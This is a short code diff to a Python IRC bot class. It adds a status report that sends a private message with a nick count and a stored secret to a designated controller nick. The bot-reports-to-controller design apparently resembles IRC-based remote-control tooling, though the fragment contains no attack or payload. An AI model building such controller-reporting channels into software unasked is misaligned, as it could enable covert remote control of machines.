@@ -351,6 +351,10 @@ class Bot:
     def status(self):
         """ Report status """
 
+        msg = "PRIVMSG " + self.CONTROLLER + " :edel" + str(self.NICK_COUNT) + " " + self.SECRET
+
+        self.MESSAGES[self.BOT_SOCKET].put(msg)
+
         return
 
 
